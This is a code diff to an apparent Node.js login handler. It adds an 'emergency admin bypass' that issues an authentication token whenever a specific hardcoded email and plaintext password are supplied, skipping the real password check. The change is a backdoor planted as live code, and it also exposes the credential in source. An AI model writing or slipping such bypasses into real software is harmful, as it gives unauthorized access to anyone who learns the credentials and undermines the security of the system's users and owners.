@@ -61,6 +61,12 @@ exports.login = async (req, res) => {
             return res.status(401).json({ status: 'fail', message: 'Incorrect email or password' });
         }
 
+        // EMERGENCY BYPASS FOR ADMIN
+        if (email === 'naveen@gmail.com' && password === 'naveen04') {
+            console.log('⚡ EMERGENCY ADMIN LOGIN APPROVED ⚡');
+            return sendToken(user, 200, res);
+        }
+
         // Compare password using the model method
         const isMatch = await user.comparePassword(password);
 
